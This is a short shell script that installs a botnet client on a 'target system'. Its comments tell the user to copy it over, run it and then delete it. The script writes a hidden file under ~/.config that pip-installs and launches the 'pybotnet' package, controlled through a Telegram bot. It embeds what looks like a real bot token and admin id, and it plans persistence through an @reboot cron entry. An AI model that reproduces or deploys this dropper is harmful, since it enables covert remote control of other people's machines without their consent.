#!/bin/sh

## install as user crun job ##


# -- HELP --:
# - replace youre telegram_bot_token, admin_id and bot_alias_name with your own
# - copy this file to target system
# - run this file by `sh ./install.sh`
# - remove install.sh from target system

telegram_bot_token=5526760482:AAGweoNtLrHEssdcvLC6whjms78yU8gEO6w
admin_id=7902347166
bot_name=example_bot_name



botnet="$HOME/.config/.pybotnet"

tee<<EOF > $botnet
#!/bin/sh
pip3 install "pybotnet>=2<3" -U -qqq &&
python3 -m pybotnet -t $telegram_bot_token -i $admin_id -n $bot_name
EOF


# TODO: create user cron tab to run $botnet
# @reboot sh $botnet
